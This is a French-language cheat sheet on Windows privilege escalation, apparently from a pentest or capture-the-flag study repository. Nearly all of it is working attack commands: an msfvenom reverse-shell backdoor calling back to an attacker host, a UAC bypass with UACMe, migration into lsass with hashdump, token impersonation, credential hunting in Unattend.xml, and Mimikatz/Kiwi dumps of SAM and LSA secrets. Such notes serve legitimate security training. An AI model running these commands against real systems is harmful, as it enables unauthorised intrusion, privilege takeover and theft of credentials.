# üè¥‚Äç‚ò†Ô∏è √âl√©vation de Privil√®ges Windows

[‚Üê Retour √† la table des mati√®res](../README.md)

## Kernel Exploits

### Local Exploit Suggester
```bash
# Dans un meterpreter actif
use post/multi/recon/local_exploit_suggester
set SESSION session_id
run
```

## Bypass UAC avec UACMe

### G√©n√©ration du payload malveillant
```bash
# G√©n√©ration avec msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe > backdoor.exe
```

### Upload et ex√©cution
```bash
# Dans le meterpreter
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .

# D√©marrer un handler dans un autre msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 4444
run

# Ex√©cution du bypass UAC (adapter selon la version)
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

### Post-bypass
```bash
# Dans le nouveau meterpreter avec privil√®ges √©lev√©s
ps -S lsass.exe
migrate PID_LSASS
hashdump
```

## Access Token Impersonation

### V√©rification des privil√®ges
```bash
# Dans meterpreter
getprivs
# Rechercher SeImpersonatePrivilege
```

### Utilisation d'Incognito
```bash
# Chargement du module
load incognito

# Liste des tokens disponibles
list_tokens -u

# Impersonation d'un token administrateur
impersonate_token "DOMAIN\\Administrator"

# Migration vers un processus stable
pgrep explorer
migrate PID_EXPLORER
```

## Credential Dumping

### PowerSploit et PowerUp
```bash
# Dans un shell Windows
cd .\Desktop\PowerSploit\Privesc\
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# Recherche dans les fichiers de configuration
cat C:\Windows\Panther\Unattend.xml
```

### D√©codage de mots de passe Base64
```powershell
# Exemple de d√©codage
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

### Utilisation des credentials d√©couverts
```cmd
# Ex√©cution en tant qu'administrateur
runas.exe /user:administrator cmd
# Entrer le mot de passe d√©couvert
whoami
```

## Kiwi Plugin (Mimikatz)

### Chargement et utilisation
```bash
# Migration vers lsass.exe (requis)
migrate -N lsass.exe

# Chargement du plugin Kiwi
load kiwi

# Dump de tous les credentials
creds_all

# Dump du SAM
lsa_dump_sam

# Dump des secrets LSA
lsa_dump_secrets
```

## Commandes utiles pour la recherche de flags

### Windows
```cmd
# Liste des r√©pertoires
dir C:\

# Lecture d'un fichier
type C:\path\to\flag.txt

# Recherche r√©cursive
dir C:\ /s /b | findstr flag
```

### Linux (via RDP)
```bash
# Connexion RDP depuis Linux
xfreerdp /u:username /p:password /v:targetIP:targetPort
```